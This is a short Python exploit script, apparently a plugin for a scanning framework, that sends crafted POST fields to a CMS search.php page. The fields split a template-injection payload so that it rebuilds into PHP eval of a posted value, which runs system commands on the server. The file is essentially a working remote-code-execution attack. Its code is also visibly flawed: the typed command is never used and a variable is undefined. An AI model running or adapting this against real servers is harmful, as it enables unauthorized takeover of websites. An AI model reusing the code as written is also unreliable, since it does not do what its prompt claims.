from lib.core.data import target
import requests
import re


def poc():
    try:
        url_check(url,"search.php")

        while 1:
            try:
                command = raw_input("[*] input the command:")
                if command != "exit":
                    post_data = {
                        "searchtype": "5",
                        "searchword": "{if{searchpage:year}",
                        "year": ":e{searchpage:area}}",
                        "area": "v{searchpage:letter}",
                        "letter": "al{searchpage:lang}",
                        "yuyan": "(join{searchpage:jq}",
                        "jq": "($_P{searchpage:ver}",
                        "ver": "OST[9]))",
                        "9[]": 'system("whoami");',
                    }

                    r = requests.post(target.url, data=post_data)
                    print(r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass
    except Exception:
        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
